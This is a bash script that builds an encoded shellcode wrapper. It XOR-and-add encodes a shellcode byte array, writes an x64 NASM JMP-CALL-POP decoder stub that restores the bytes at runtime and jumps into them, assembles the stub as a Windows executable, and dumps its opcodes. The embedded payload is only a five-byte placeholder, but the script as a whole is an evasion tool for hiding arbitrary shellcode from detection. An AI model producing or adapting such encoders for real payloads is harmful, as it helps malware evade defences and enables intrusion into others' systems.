#!/bin/bash
shellcode=(0xfc 0x48 0x83 0xe4 0xf0)
encodedShellcode=()
for byte in "${shellcode[@]}"; do
        byte=$((byte ^ 0x55))
        byte=$((byte + 1))
        byte=$((byte ^ 0x11))
        encodedShellcode+=($byte)
done
printf -v printFriendly '0x%02x,' "${encodedShellcode[@]}";
SHELLCODE_ARRAY=$(printFriendly=${printFriendly%,}; echo -e "$printFriendly")
SIZE_HEX=$(printf "0x%x\n" "${#shellcode[@]}";size=$(printf "0x%x" "${#shellcode[@]}"))
echo -e "$SIZE_HEX\n"
#------------------------------------------------------------------------------------------------------------------------------------
cat <<eof > ./64_decoder.asm
global _start

section .text
    _start:
        jmp short shellcode

    decoder:
        pop rax                 ; store encodedShellcode address in rax - this is the address that we will jump to once all the bytes in the encodedShellcode have been decoded

    setup:
        xor rcx, rcx            ; reset rcx to 0, will use this as a loop counter
        mov rdx, $SIZE_HEX       ; shellcode size

    decoderStub:
        cmp rcx, rdx            ; check if we've iterated and decoded all the encoded bytes
        je encodedShellcode     ; jump to the encodedShellcode, which actually now contains the decoded shellcode

        ; encodedShellcode bytes are being decoded here per our decoding scheme
        xor byte [rax], 0x11    ; 1. xor byte with 0x11
        dec byte [rax]          ; 2. decremenet byte by 1
        xor byte [rax], 0x55    ; 3. xor byte with 0x55

        inc rax                 ; point rax to the next encoded byte in encodedShellcode
        inc rcx                 ; increase loop counter
        jmp short decoderStub   ; repeat decoding procedure

    shellcode:
        call decoder            ; jump to decoder label. This pushes the address of encodedShellcode to the stack (to be popped into rax as the first instruction under the decoder label)
        encodedShellcode: db $SHELLCODE_ARRAY
eof
nasm -f win64 64_decoder.asm -o coff_64.obj
ld -b pe-x86-64 -o duel_64.exe coff_64.obj
for i in $(objdump -d duel_64.exe | grep "^ " |cut -f2); do echo -n '\x'$i; done
